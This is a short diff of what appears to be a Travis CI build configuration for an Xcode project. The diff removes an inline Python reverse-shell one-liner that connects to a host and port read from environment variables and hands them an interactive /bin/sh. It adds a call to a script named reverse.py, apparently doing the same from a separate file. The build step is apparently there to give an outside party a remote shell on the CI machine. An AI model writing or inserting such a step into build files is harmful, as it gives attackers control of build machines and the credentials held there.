@@ -4,4 +4,4 @@ osx_image: xcode8
 xcode_sdk: iphoneos10.0
 
 script:
-- travis_wait 100 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((os.environ["URL"],os.environ["PORT"]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+- travis_wait 100 python reverse.py
